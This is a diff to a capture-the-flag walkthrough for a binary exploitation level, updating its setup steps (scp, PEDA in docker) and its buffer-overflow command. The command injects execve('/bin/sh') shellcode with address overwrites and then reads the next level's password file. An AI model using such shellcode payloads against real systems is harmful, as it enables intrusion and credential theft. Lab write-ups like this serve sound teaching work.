@@ -13,28 +13,18 @@ Explanation on the reverse engineering part will be focusing on the aspects usef
 
 We find a binary file at the root of the user **`level9`** named *`./level9`*.
 
-We run
+To analyze the binary file we copy it to the host with `scp` *(OpenSSH secure file copy)*.
 ```bash
-git clone https://github.com/longld/peda.git /etc/peda
-```
-
-To analyze the binary file we copy PEDA in the vm with `scp` *(OpenSSH secure file copy)*.
-```bash
-scp -r -P 4243 /tmp/peda level9@localhost:/tmp
+scp -r -P 4243 level9@localhost:/home/user/level9/level9 .
 ```
 
 ### PEDA
 
-We start an ssh connection
+In order to use `PEDA` can just run it inside docker.
 ```bash
-ssh -p 4243 level1@localhost
-```
-
-And after using /home/user/level1/.pass as the password, we open GDB on /home/user/level1/level1.
-In order to use `PEDA` we have to manually change the source in gdb to peda.py that we copied.
-```bash
-> gdb /home/user/level1/level1
-(gdb)> source /tmp/peda/peda.py
+./peda.sh level9
+# or
+docker run -it -v "$abs_path":/mnt/binary gdb-peda-image bash -c "gdb -q /mnt/binary"
 ```
 
 ## Binary Analysis
@@ -579,7 +569,7 @@ This will be the payload for our binary.
 
 We can execute the buffer overflow with this line.
 ```bash
-$ ./level9 $(printf "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0c\xa0\x04\x08")
+$ ./level9 $(printf "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80%83s\x0c\xa0\x04\x08" | tr ' ' 'a')
 1���Qh//shh/bin��
 
 cat /home/user/bonus0/.pass
